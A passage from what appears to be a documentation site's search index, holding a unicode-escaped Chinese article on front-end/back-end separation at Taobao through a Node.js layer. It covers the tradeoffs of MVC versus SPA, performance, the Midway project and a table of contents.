\u7389\u4f2f\u63d0\u5230\u7684\u51e0\u79cd\u5f00\u53d1\u6a21\u5f0f\uff0c\u5404\u6709\u5404\u7684\u9002\u7528\u573a\u666f\uff0c\u6ca1\u6709\u54ea\u4e00\u79cd\u5b8c\u5168\u53d6\u4ee3\u53e6\u5916\u4e00\u79cd\u3002 \u6bd4\u5982\u540e\u7aef\u4e3a\u4e3b\u7684 MVC\uff0c\u505a\u4e00\u4e9b\u540c\u6b65\u5c55\u73b0\u7684\u4e1a\u52a1\u6548\u7387\u5f88\u9ad8\uff0c\u4f46\u662f\u9047\u5230\u540c\u6b65\u5f02\u6b65\u7ed3\u5408\u7684\u9875\u9762\uff0c\u4e0e\u540e\u7aef\u5f00\u53d1\u6c9f\u901a\u8d77\u6765\u5c31\u4f1a\u6bd4\u8f83\u9ebb\u70e6\u3002 AJAX \u4e3a\u4e3b SPA \u578b\u5f00\u53d1\u6a21\u5f0f\uff0c\u6bd4\u8f83\u9002\u5408\u5f00\u53d1 APP \u7c7b\u578b\u7684\u573a\u666f\uff0c\u4f46\u662f\u53ea\u9002\u5408\u505a APP\uff0c\u56e0\u4e3a SEO \u7b49\u95ee\u9898\u4e0d\u597d\u89e3\u51b3\uff0c\u5bf9\u4e8e\u5f88\u591a\u7c7b\u578b\u7684\u7cfb\u7edf\uff0c\u8fd9\u79cd\u5f00\u53d1\u65b9\u5f0f\u4e5f\u8fc7\u91cd\u3002 2.2. \u524d\u540e\u7aef\u804c\u8d23\u4e0d\u6e05 # \u5728\u4e1a\u52a1\u903b\u8f91\u590d\u6742\u7684\u7cfb\u7edf\u91cc\uff0c\u6211\u4eec\u6700\u6015\u7ef4\u62a4\u524d\u540e\u7aef\u6df7\u6742\u5728\u4e00\u8d77\u7684\u4ee3\u7801\uff0c\u56e0\u4e3a\u6ca1\u6709\u7ea6\u675f\uff0cM-V-C \u6bcf\u4e00\u5c42\u90fd\u53ef\u80fd\u51fa\u73b0\u522b\u7684\u5c42\u7684\u4ee3\u7801\uff0c\u65e5\u79ef\u6708\u7d2f\uff0c\u5b8c\u5168\u6ca1\u6709\u7ef4\u62a4\u6027\u53ef\u8a00\u3002 \u867d\u7136\u524d\u540e\u7aef\u5206\u79bb\u6ca1\u529e\u6cd5\u5b8c\u5168\u89e3\u51b3\u8fd9\u79cd\u95ee\u9898\uff0c\u4f46\u662f\u53ef\u4ee5\u5927\u5927\u7f13\u89e3\u3002\u56e0\u4e3a\u4ece\u7269\u7406\u5c42\u6b21\u4e0a\u4fdd\u8bc1\u4e86\u4f60\u4e0d\u53ef\u80fd\u8fd9\u4e48\u505a\u3002 2.3. \u5f00\u53d1\u6548\u7387\u95ee\u9898 # \u6dd8\u5b9d\u7684 Web \u57fa\u672c\u4e0a\u90fd\u662f\u57fa\u4e8e MVC \u6846\u67b6 webx\uff0c\u67b6\u6784\u51b3\u5b9a\u4e86\u524d\u7aef\u53ea\u80fd\u4f9d\u8d56\u540e\u7aef\u3002 \u6240\u4ee5\u6211\u4eec\u7684\u5f00\u53d1\u6a21\u5f0f\u4f9d\u7136\u662f\uff0c\u524d\u7aef\u5199\u597d\u9759\u6001 demo\uff0c\u540e\u7aef\u7ffb\u8bd1\u6210 VM \u6a21\u7248\uff0c\u8fd9\u79cd\u6a21\u5f0f\u7684\u95ee\u9898\u5c31\u4e0d\u8bf4\u4e86\uff0c\u88ab\u5410\u69fd\u4e86\u5f88\u4e45\u3002\u76f4\u63a5\u57fa\u4e8e\u540e\u7aef\u73af\u5883\u5f00\u53d1\u4e5f\u5f88\u75db\u82e6\uff0c\u914d\u7f6e\u5b89\u88c5\u4f7f\u7528\u90fd\u5f88\u9ebb\u70e6\u3002 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u53d1\u660e\u4e86\u5404\u79cd\u5de5\u5177\uff0c\u6bd4\u5982 VMarket\uff0c\u4f46\u662f\u524d\u7aef\u8fd8\u662f\u8981\u5199 VM\uff0c\u800c\u4e14\u4f9d\u8d56\u540e\u7aef\u6570\u636e\uff0c\u6548\u7387\u4f9d\u7136\u4e0d\u9ad8\u3002\u53e6\u5916\uff0c\u540e\u7aef\u4e5f\u6ca1\u6cd5\u6446\u8131\u5bf9\u5c55\u73b0\u7684\u5f3a\u5173\u6ce8\uff0c\u4ece\u800c\u4e13\u5fc3\u4e8e\u4e1a\u52a1\u903b\u8f91\u5c42\u7684\u5f00\u53d1\u3002 2.4. \u5bf9\u524d\u7aef\u53d1\u6325\u7684\u5c40\u9650 # \u6027\u80fd\u4f18\u5316\u5982\u679c\u53ea\u5728\u524d\u7aef\u505a\u7a7a\u95f4\u975e\u5e38\u6709\u9650\uff0c\u4e8e\u662f\u6211\u4eec\u7ecf\u5e38\u9700\u8981\u540e\u7aef\u5408\u4f5c\u624d\u80fd\u78b0\u649e\u51fa\u706b\u82b1\uff0c\u4f46\u7531\u4e8e\u540e\u7aef\u6846\u67b6\u9650\u5236\uff0c\u6211\u4eec\u5f88\u96be\u4f7f\u7528 Comet \u3001 Bigpipe \u7b49\u6280\u672f\u65b9\u6848\u6765\u4f18\u5316\u6027\u80fd\u3002 \u4e3a\u4e86\u89e3\u51b3\u4ee5\u4e0a\u63d0\u5230\u7684\u4e00\u4e9b\u95ee\u9898\uff0c\u6211\u4eec\u8fdb\u884c\u4e86\u5f88\u591a\u5c1d\u8bd5\uff0c\u5f00\u53d1\u4e86\u5404\u79cd\u5de5\u5177\uff0c\u4f46\u59cb\u7ec8\u6ca1\u6709\u592a\u591a\u8d77\u8272\uff0c\u4e3b\u8981\u662f\u56e0\u4e3a\u6211\u4eec\u53ea\u80fd\u5728\u540e\u7aef\u7ed9\u6211\u4eec\u5212\u5206\u7684\u90a3\u4e00\u5c0f\u5757\u7a7a\u95f4\u53bb\u53d1\u6325\u3002\u53ea\u6709\u771f\u6b63\u505a\u5230\u524d\u540e\u7aef\u5206\u79bb\uff0c\u6211\u4eec\u624d\u80fd\u5f7b\u5e95\u89e3\u51b3\u4ee5\u4e0a\u95ee\u9898\u3002 3. \u600e\u4e48\u505a\u524d\u540e\u7aef\u5206\u79bb # \u600e\u4e48\u505a\u524d\u540e\u7aef\u5206\u79bb\uff0c\u5176\u5b9e\u7b2c\u4e00\u8282\u4e2d\u5df2\u7ecf\u6709\u4e86\u7b54\u6848\uff1a \u524d\u7aef\uff1a\u8d1f\u8d23 View \u548c Controller \u5c42\u3002 \u540e\u7aef\uff1a\u8d1f\u8d23 Model \u5c42\uff0c\u4e1a\u52a1\u5904\u7406/\u6570\u636e\u7b49\u3002 \\text{Figure 1. \u600e\u4e48\u505a\u524d\u540e\u7aef\u5206\u79bb} \u8bd5\u60f3\u4e00\u4e0b\uff0c\u5982\u679c\u524d\u7aef\u638c\u63e1\u4e86 Controller \uff0c\u6211\u4eec\u53ef\u4ee5\u505a URL design\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u573a\u666f\u51b3\u5b9a\u5728\u670d\u52a1\u7aef\u540c\u6b65\u6e32\u67d3\uff0c\u8fd8\u662f\u6839\u636e View \u5c42\u6570\u636e\u8f93\u51fa JSON \u6570\u636e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u6839\u636e\u8868\u73b0\u5c42\u9700\u6c42\u5f88\u5bb9\u6613\u7684\u505a Bigpipe\uff0cComet\uff0cSocket \u7b49\u7b49\uff0c\u5b8c\u5168\u662f\u9700\u6c42\u51b3\u5b9a\u4f7f\u7528\u65b9\u5f0f\u3002 3.1. \u57fa\u4e8eNodeJS\u201c\u5168\u6808\u201d\u5f0f\u5f00\u53d1 # \u5982\u679c\u60f3\u5b9e\u73b0\u4e0a\u56fe\u7684\u5206\u5c42\uff0c\u5c31\u5fc5\u7136\u9700\u8981\u4e00\u79cdweb\u670d\u52a1\u5e2e\u6211\u4eec\u5b9e\u73b0\u4ee5\u524d\u540e\u7aef\u505a\u7684\u4e8b\u60c5\uff0c\u4e8e\u662f\u5c31\u6709\u4e86\u6807\u9898\u63d0\u5230\u7684\u201c\u57fa\u4e8eNodeJS\u7684\u5168\u6808\u5f0f\u5f00\u53d1\u201d\u3002 \\text{Figure 2. \u57fa\u4e8eNodeJS\u201c\u5168\u6808\u201d\u5f0f\u5f00\u53d1} \u8fd9\u5f20\u56fe\u770b\u8d77\u6765\u7b80\u5355\u800c\u4e14\u5f88\u597d\u7406\u89e3\uff0c\u4f46\u6ca1\u5c1d\u8bd5\u8fc7\uff0c\u4f1a\u6709\u5f88\u591a\u7591\u95ee\u3002 SPA \u6a21\u5f0f\u4e2d\uff0c\u540e\u7aef\u5df2\u4f9b\u4e86\u6240\u9700\u7684\u6570\u636e\u63a5\u53e3\uff0cView \u524d\u7aef\u5df2\u7ecf\u53ef\u4ee5\u63a7\u5236\uff0c\u4e3a\u4ec0\u4e48\u8981\u591a\u52a0 Node.js \u8fd9\u4e00\u5c42\uff1f \u591a\u52a0\u4e00\u5c42\uff0c\u6027\u80fd\u600e\u4e48\u6837\uff1f \u591a\u52a0\u4e00\u5c42\uff0c\u524d\u7aef\u7684\u5de5\u4f5c\u91cf\u662f\u4e0d\u662f\u589e\u52a0\u4e86\uff1f \u591a\u52a0\u4e00\u5c42\u5c31\u591a\u4e00\u5c42\u98ce\u9669\uff0c\u600e\u4e48\u7834\uff1f Node.js \u4ec0\u4e48\u90fd\u80fd\u505a\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u8981 Java\uff1f \u8fd9\u4e9b\u95ee\u9898\u8981\u8bf4\u6e05\u695a\u4e0d\u5bb9\u6613\uff0c\u4e0b\u9762\u8bf4\u4e0b\u6211\u7684\u8ba4\u8bc6\u8fc7\u7a0b\u3002 3.2. \u4e3a\u4ec0\u4e48\u8981\u589e\u52a0\u4e00\u5c42 Node.js # \u73b0\u9636\u6bb5\u6211\u4eec\u4e3b\u8981\u4ee5\u540e\u7aef MVC \u7684\u6a21\u5f0f\u8fdb\u884c\u5f00\u53d1\uff0c\u8fd9\u79cd\u6a21\u5f0f\u4e25\u91cd\u963b\u788d\u4e86\u524d\u7aef\u5f00\u53d1\u6548\u7387\uff0c\u4e5f\u8ba9\u540e\u7aef\u4e0d\u80fd\u4e13\u6ce8\u4e8e\u4e1a\u52a1\u5f00\u53d1\u3002 \u89e3\u51b3\u65b9\u6848\u662f\u8ba9\u524d\u7aef\u80fd\u63a7\u5236 Controller \u5c42\uff0c\u4f46\u662f\u5982\u679c\u5728\u73b0\u6709\u6280\u672f\u4f53\u7cfb\u4e0b\u5f88\u96be\u505a\u5230\uff0c\u56e0\u4e3a\u4e0d\u53ef\u80fd\u8ba9\u6240\u6709\u524d\u7aef\u90fd\u5b66 Java\uff0c\u5b89\u88c5\u540e\u7aef\u7684\u5f00\u53d1\u73af\u5883\uff0c\u5199 VM\u3002 Node.js \u5c31\u80fd\u5f88\u597d\u7684\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u65e0\u9700\u5b66\u4e60\u4e00\u95e8\u65b0\u7684\u8bed\u8a00\uff0c\u5c31\u80fd\u505a\u5230\u4ee5\u524d\u5f00\u53d1\u5e2e\u6211\u4eec\u505a\u7684\u4e8b\u60c5\uff0c\u4e00\u5207\u90fd\u663e\u5f97\u90a3\u4e48\u81ea\u7136\u3002 3.3. \u6027\u80fd\u95ee\u9898 # \u5206\u5c42\u5c31\u6d89\u53ca\u6bcf\u5c42\u4e4b\u95f4\u7684\u901a\u8baf\uff0c\u80af\u5b9a\u4f1a\u6709\u4e00\u5b9a\u7684\u6027\u80fd\u635f\u8017\u3002\u4f46\u662f\u5408\u7406\u7684\u5206\u5c42\u80fd\u8ba9\u804c\u8d23\u6e05\u6670\u3001\u4e5f\u65b9\u4fbf\u534f\u4f5c\uff0c\u4f1a\u5927\u5927\u63d0\u9ad8\u5f00\u53d1\u6548\u7387\u3002\u5206\u5c42\u5e26\u6765\u7684\u635f\u5931\uff0c\u4e00\u5b9a\u80fd\u5728\u5176\u4ed6\u65b9\u9762\u7684\u6536\u76ca\u5f25\u8865\u56de\u6765\u3002 \u53e6\u5916\uff0c\u4e00\u65e6\u51b3\u5b9a\u5206\u5c42\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f18\u5316\u901a\u8baf\u65b9\u5f0f\u3001\u901a\u8baf\u534f\u8bae\uff0c\u5c3d\u53ef\u80fd\u628a\u635f\u8017\u964d\u5230\u6700\u4f4e\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff1a \u6dd8\u5b9d\u5b9d\u8d1d\u8be6\u60c5\u9875\u9759\u6001\u5316\u4e4b\u540e\uff0c\u8fd8\u662f\u6709\u4e0d\u5c11\u9700\u8981\u5b9e\u65f6\u83b7\u53d6\u7684\u4fe1\u606f\uff0c\u6bd4\u5982\u7269\u6d41\u3001\u4fc3\u9500\u7b49\u7b49\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u4fe1\u606f\u5728\u4e0d\u540c\u4e1a\u52a1\u7cfb\u7edf\u4e2d\uff0c\u6240\u4ee5\u9700\u8981\u524d\u7aef\u53d1\u9001 5\uff0c6 \u4e2a\u5f02\u6b65\u8bf7\u6c42\u6765\u56de\u586b\u8fd9\u4e9b\u5185\u5bb9\u3002 \u6709\u4e86 Node.js \u4e4b\u540e\uff0c\u524d\u7aef\u53ef\u4ee5\u5728 Node.js \u4e2d\u53bb\u4ee3\u7406\u8fd9 5 \u4e2a\u5f02\u6b65\u8bf7\u6c42\uff0c\u8fd8\u80fd\u5f88\u5bb9\u6613\u7684\u505a Bigpipe\uff0c\u8fd9\u5757\u7684\u4f18\u5316\u80fd\u8ba9\u6574\u4e2a\u6e32\u67d3\u6548\u7387\u63d0\u5347\u5f88\u591a\u3002 \u53ef\u80fd\u5728 PC \u4e0a\u4f60\u89c9\u5f97\u53d1 5\u30016 \u4e2a\u5f02\u6b65\u8bf7\u6c42\u4e5f\u6ca1\u4ec0\u4e48\uff0c\u4f46\u662f\u5728\u65e0\u7ebf\u7aef\uff0c\u5728\u5ba2\u6237\u624b\u673a\u4e0a\u5efa\u7acb\u4e00\u4e2a HTTP \u8bf7\u6c42\u5f00\u9500\u5f88\u5927\uff0c\u6709\u4e86\u8fd9\u4e2a\u4f18\u5316\uff0c\u6027\u80fd\u4e00\u4e0b\u63d0\u5347\u597d\u51e0\u500d\u3002 \u6dd8\u5b9d\u8be6\u60c5\u57fa\u4e8e Node.js \u7684\u4f18\u5316\u6211\u4eec\u6b63\u5728\u8fdb\u884c\u4e2d\uff0c\u4e0a\u7ebf\u4e4b\u540e\u6211\u4f1a\u5206\u4eab\u4e00\u4e0b\u4f18\u5316\u7684\u8fc7\u7a0b\u3002 3.4. \u524d\u7aef\u7684\u5de5\u4f5c\u91cf\u662f\u5426\u589e\u52a0\u4e86 # \u76f8\u5bf9\u4e8e\u53ea\u5207\u9875\u9762/\u505a demo\uff0c\u80af\u5b9a\u662f\u589e\u52a0\u4e86\u4e00\u70b9\uff0c\u4f46\u662f\u5f53\u524d\u6a21\u5f0f\u4e0b\u6709\u8054\u8c03\u3001\u6c9f\u901a\u73af\u8282\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u975e\u5e38\u82b1\u65f6\u95f4\uff0c\u4e5f\u5bb9\u6613\u51fa bug\uff0c\u8fd8\u5f88\u96be\u7ef4\u62a4\u3002\u6240\u4ee5\uff0c\u867d\u7136\u5de5\u4f5c\u91cf\u4f1a\u589e\u52a0\u4e00\u70b9\uff0c\u4f46\u662f\u603b\u4f53\u5f00\u53d1\u6548\u7387\u4f1a\u63d0\u5347\u5f88\u591a\u3002 \u53e6\u5916\uff0c\u6d4b\u8bd5\u6210\u672c\u53ef\u4ee5\u8282\u7701\u5f88\u591a\u3002\u4ee5\u524d\u5f00\u53d1\u7684\u63a5\u53e3\u90fd\u662f\u9488\u5bf9\u8868\u73b0\u5c42\u7684\uff0c\u5f88\u96be\u5199\u6d4b\u8bd5\u7528\u4f8b\u3002\u5982\u679c\u505a\u4e86\u524d\u540e\u7aef\u5206\u79bb\uff0c\u751a\u81f3\u6d4b\u8bd5\u90fd\u53ef\u4ee5\u5206\u5f00\uff0c\u4e00\u62e8\u4eba\u4e13\u95e8\u6d4b\u8bd5\u63a5\u53e3\uff0c\u4e00\u62e8\u4eba\u4e13\u6ce8\u6d4b\u8bd5 UI\uff08\u8fd9\u90e8\u5206\u5de5\u4f5c\u751a\u81f3\u53ef\u4ee5\u7528\u5de5\u5177\u4ee3\u66ff\uff09\u3002 3.5. \u589e\u52a0 Node.js \u5c42\u5e26\u6765\u7684\u98ce\u9669\u600e\u4e48\u63a7\u5236 # \u968f\u7740 Node.js \u5927\u89c4\u6a21\u4f7f\u7528\uff0c\u7cfb\u7edf/\u8fd0\u7ef4/\u5b89\u5168\u90e8\u95e8\u7684\u540c\u5b66\u4e5f\u4e00\u5b9a\u4f1a\u52a0\u5165\u5230\u57fa\u7840\u5efa\u8bbe\u4e2d\uff0c\u4ed6\u4eec\u4f1a\u5e2e\u52a9\u6211\u4eec\u53bb\u5b8c\u5584\u5404\u4e2a\u73af\u8282\u53ef\u80fd\u51fa\u73b0\u7684\u95ee\u9898\uff0c\u4fdd\u969c\u7cfb\u7684\u7a33\u5b9a\u6027\u3002 3.6. Node.js \u4ec0\u4e48\u90fd\u80fd\u505a\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u8981 Java # \u6211\u4eec\u7684\u521d\u8877\u662f\u505a\u524d\u540e\u7aef\u5206\u79bb\uff0c\u5982\u679c\u8003\u8651\u8fd9\u4e2a\u95ee\u9898\u5c31\u6709\u70b9\u8fdd\u80cc\u6211\u4eec\u7684\u521d\u8877\u4e86\u3002\u5373\u4f7f\u7528 Node.js \u66ff\u4ee3 Java\uff0c\u6211\u4eec\u4e5f\u6ca1\u529e\u6cd5\u4fdd\u8bc1\u4e0d\u51fa\u73b0\u4eca\u5929\u9047\u5230\u7684\u79cd\u79cd\u95ee\u9898\uff0c\u6bd4\u5982\u804c\u8d23\u4e0d\u6e05\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u5206\u5c42\u5f00\u53d1\uff0c\u4e13\u4e1a\u7684\u4eba\uff0c\u4e13\u6ce8\u505a\u4e13\u4e1a\u7684\u4e8b\u3002\u57fa\u4e8e Java \u7684\u57fa\u7840\u67b6\u6784\u5df2\u7ecf\u975e\u5e38\u5f3a\u5927\u800c\u4e14\u7a33\u5b9a\uff0c\u800c\u4e14\u66f4\u9002\u5408\u505a\u73b0\u5728\u67b6\u6784\u7684\u4e8b\u60c5\u3002 4. \u6dd8\u5b9d\u57fa\u4e8e Node.js \u7684\u524d\u540e\u7aef\u5206\u79bb # \\text{Figure 3. \u6dd8\u5b9d\u57fa\u4e8eNode.js\u7684\u524d\u540e\u7aef\u5206\u79bb} \u4e0a\u56fe\u662f\u6211\u7406\u89e3\u7684\u6dd8\u5b9d\u57fa\u4e8e Node.js \u7684\u524d\u540e\u7aef\u5206\u79bb\u5206\u5c42\uff0c\u4ee5\u53ca Node.js \u7684\u804c\u8d23\u8303\u56f4\u3002\u7b80\u5355\u89e3\u91ca\u4e0b\uff1a \u6700\u4e0a\u7aef\u662f\u670d\u52a1\u7aef\uff0c\u5c31\u662f\u6211\u4eec\u5e38\u8bf4\u7684\u540e\u7aef\u3002\u540e\u7aef\u5bf9\u4e8e\u6211\u4eec\u6765\u8bf4\uff0c\u5c31\u662f\u4e00\u4e2a\u63a5\u53e3\u7684\u96c6\u5408\uff0c\u670d\u52a1\u7aef\u63d0\u4f9b\u5404\u79cd\u5404\u6837\u7684\u63a5\u53e3\u4f9b\u6211\u4eec\u4f7f\u7528\u3002\u56e0\u4e3a\u6709 Node.js \u5c42\uff0c\u4e5f\u4e0d\u7528\u5c40\u9650\u662f\u4ec0\u4e48\u5f62\u5f0f\u7684\u670d\u52a1\u3002\u5bf9\u4e8e\u540e\u7aef\u5f00\u53d1\u6765\u8bf4\uff0c\u4ed6\u4eec\u53ea\u7528\u5173\u5fc3\u4e1a\u52a1\u4ee3\u7801\u7684\u63a5\u53e3\u5b9e\u73b0\u3002 \u670d\u52a1\u7aef\u4e0b\u9762\u662f Node.js \u5e94\u7528\u3002 Node.js \u5e94\u7528\u4e2d\u6709\u4e00\u5c42 Model Proxy \u4e0e\u670d\u52a1\u7aef\u8fdb\u884c\u901a\u8baf\u3002\u8fd9\u4e00\u5c42\u4e3b\u8981\u76ee\u524d\u662f\u62b9\u5e73\u6211\u4eec\u5bf9\u4e0d\u540c\u63a5\u53e3\u7684\u8c03\u7528\u65b9\u5f0f\uff0c\u5c01\u88c5\u4e00\u4e9b View \u5c42\u9700\u8981\u7684 Model\u3002 Node.js \u5c42\u8fd8\u80fd\u8f7b\u677e\u5b9e\u73b0\u539f\u6765 vmcommon, tms\uff08\u5f15\u7528\u6dd8\u5b9d\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf\uff09\u7b49\u9700\u6c42\u3002 Node.js \u5c42\u8981\u4f7f\u7528\u4ec0\u4e48\u6846\u67b6\u7531\u5f00\u53d1\u8005\u81ea\u5df1\u51b3\u5b9a\u3002\u4e0d\u8fc7\u63a8\u8350\u4f7f\u7528 Express + XTemplate \u7684\u7ec4\u5408\uff0cXTemplate \u80fd\u505a\u5230\u524d\u540e\u7aef\u516c\u7528\u3002 \u600e\u4e48\u7528 Node.js \u5927\u5bb6\u81ea\u5df1\u51b3\u5b9a\uff0c\u4f46\u662f\u4ee4\u4eba\u5174\u594b\u7684\u662f\uff0c\u6211\u4eec\u7ec8\u4e8e\u53ef\u4ee5\u4f7f\u7528 Node.js \u8f7b\u677e\u5b9e\u73b0\u6211\u4eec\u60f3\u8981\u7684\u8f93\u51fa\u65b9\u5f0f\uff1a JSON/JSONP/RESTful/HTML/BigPipe/Comet/Socket/\u540c\u6b65\u3001\u5f02\u6b65\uff0c\u60f3\u600e\u4e48\u6574\u5c31\u600e\u4e48\u6574\uff0c\u5b8c\u5168\u6839\u636e\u4f60\u7684\u573a\u666f\u51b3\u5b9a\u3002 \u6d4f\u89c8\u5668\u5c42\u5728\u6211\u4eec\u8fd9\u4e2a\u67b6\u6784\u4e2d\u6ca1\u6709\u53d8\u5316\uff0c\u4e5f\u4e0d\u5e0c\u671b\u56e0\u4e3a\u5f15\u5165 Node.js \u6539\u53d8\u4f60\u4ee5\u524d\u5728\u6d4f\u89c8\u5668\u4e2d\u5f00\u53d1\u7684\u8ba4\u77e5\u3002 \u5f15\u5165 Node.js\uff0c\u53ea\u662f\u628a\u672c\u8be5\u5c31\u524d\u7aef\u63a7\u5236\u7684\u90e8\u5206\u4ea4\u7531\u524d\u7aef\u638c\u63a7\u3002 \u8fd9\u79cd\u6a21\u5f0f\u6211\u4eec\u5df2\u7ecf\u6709\u4e24\u4e2a\u9879\u76ee\u5728\u5f00\u53d1\u4e2d\uff0c\u867d\u7136\u8fd8\u6ca1\u4e0a\u7ebf\uff0c\u4f46\u662f\u65e0\u8bba\u662f\u5728\u5f00\u53d1\u6548\u7387\uff0c\u8fd8\u662f\u5728\u6027\u80fd\u4f18\u5316\u65b9\u9762\uff0c\u6211\u4eec\u90fd\u5df2\u7ecf\u5c1d\u5230\u4e86\u751c\u5934\u3002 5. \u6211\u4eec\u8fd8\u9700\u8981\u8981\u505a\u4ec0\u4e48 # \u628a Node.js \u7684\u5f00\u53d1\u6d41\u7a0b\u96c6\u6210\u5230\u6dd8\u5b9d\u73b0\u6709\u7684 SCM \u6d41\u7a0b\u4e2d\u3002 \u57fa\u7840\u8bbe\u65bd\u5efa\u8bbe\uff0c\u6bd4\u5982 session, logger \u7b49\u901a\u7528\u6a21\u5757\u3002 \u6700\u4f73\u5f00\u53d1\u5b9e\u8df5 \u7ebf\u4e0a\u6210\u529f\u6848\u4f8b \u5927\u5bb6\u5bf9 Node.js \u524d\u540e\u7aef\u5206\u79bb\u6982\u5ff5\u7684\u8ba4\u8bc6 \u5b89\u5168 \u6027\u80fd \u2026 \u6280\u672f\u4e0a\u4e0d\u4f1a\u6709\u592a\u591a\u9700\u8981\u53bb\u521b\u65b0\u548c\u7814\u7a76\u7684\uff0c\u5df2\u7ecf\u6709\u975e\u5e38\u591a\u73b0\u6210\u7684\u79ef\u7d2f\u3002\u5176\u5b9e\u5173\u952e\u662f\u4e00\u4e9b\u6d41\u7a0b\u7684\u6253\u901a\u548c\u901a\u7528\u89e3\u51b3\u65b9\u6848\u7684\u79ef\u7d2f\uff0c\u76f8\u4fe1\u968f\u7740\u66f4\u591a\u7684\u9879\u76ee\u5b9e\u8df5\uff0c\u8fd9\u5757\u6162\u6162\u4f1a\u53d8\u6210\u4e00\u4e2a\u7a33\u5b9a\u7684\u6d41\u7a0b\u3002 6. \u201c\u4e2d\u9014\u5c9b\u201d # \u867d\u7136\u201c\u57fa\u4e8e Node.js \u7684\u5168\u6808\u5f0f\u5f00\u53d1\u201d\u6a21\u5f0f\u5f88\u8ba9\u4eba\u5174\u594b\uff0c\u4f46\u662f\u628a\u57fa\u4e8e Node.js \u7684\u5168\u6808\u5f00\u53d1\u53d8\u6210\u4e00\u4e2a\u7a33\u5b9a\uff0c\u8ba9\u5927\u5bb6\u90fd\u80fd\u63a5\u53d7\u7684\u4e1c\u897f\u8fd8\u6709\u5f88\u591a\u8def\u8981\u8d70\uff0c\u6211\u4eec\u6b63\u5728\u8fdb\u884c\u7684\u201c\u4e2d\u9014\u5c9b\u201d\u9879\u76ee\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u867d\u7136\u6211\u4eec\u8d77\u6b65\u4e0d\u4e45\uff0c\u4f46\u662f\u79bb\u76ee\u6807\u5df2\u7ecf\u8d8a\u6765\u8d8a\u8fd1\uff01\uff01","title":"1.\u524d\u540e\u7aef\u5206\u79bb\u7684\u601d\u8003\u4e0e\u5b9e\u8df5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#_1","text":"","title":"\u524d\u540e\u7aef\u5206\u79bb\u7684\u601d\u8003\u4e0e\u5b9e\u8df5\uff08\u4e00\uff09"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#nodejs-nodejs","text":"","title":"\u4e5f\u8c08\u57fa\u4e8e Node.js \u7684\u5168\u6808\u5f0f\u5f00\u53d1\uff08\u57fa\u4e8e Node.js \u7684\u524d\u540e\u7aef\u5206\u79bb\uff09"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#_2","text":"\u524d\u540e\u7aef\u5206\u79bb\u7684\u601d\u8003\u4e0e\u5b9e\u8df5\uff08\u4e00\uff09 \u4e5f\u8c08\u57fa\u4e8e Node.js \u7684\u5168\u6808\u5f0f\u5f00\u53d1\uff08\u57fa\u4e8e Node.js \u7684\u524d\u540e\u7aef\u5206\u79bb\uff09 \u76ee\u5f55 \u80cc\u666f \u524d\u8a00 1. \u4ec0\u4e48\u662f\u524d\u540e\u7aef\u5206\u79bb 2. \u4e3a\u4ec0\u4e48\u8981\u524d\u540e\u7aef\u5206\u79bb 2.1. \u73b0\u6709\u5f00\u53d1\u6a21\u5f0f\u7684\u9002\u7528\u573a\u666f 2.2. \u524d\u540e\u7aef\u804c\u8d23\u4e0d\u6e05 2.3. \u5f00\u53d1\u6548\u7387\u95ee\u9898 2.4. \u5bf9\u524d\u7aef\u53d1\u6325\u7684\u5c40\u9650 3. \u600e\u4e48\u505a\u524d\u540e\u7aef\u5206\u79bb 3.1. \u57fa\u4e8eNodeJS\u201c\u5168\u6808\u201d\u5f0f\u5f00\u53d1 3.2. \u4e3a\u4ec0\u4e48\u8981\u589e\u52a0\u4e00\u5c42 Node.js 3.3. \u6027\u80fd\u95ee\u9898 3.4. \u524d\u7aef\u7684\u5de5\u4f5c\u91cf\u662f\u5426\u589e\u52a0\u4e86 3.5. \u589e\u52a0 Node.js \u5c42\u5e26\u6765\u7684\u98ce\u9669\u600e\u4e48\u63a7\u5236 3.6. Node.js \u4ec0\u4e48\u90fd\u80fd\u505a\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u8981 Java 4. \u6dd8\u5b9d\u57fa\u4e8e Node.js \u7684\u524d\u540e\u7aef\u5206\u79bb 5. \u6211\u4eec\u8fd8\u9700\u8981\u8981\u505a\u4ec0\u4e48 6. 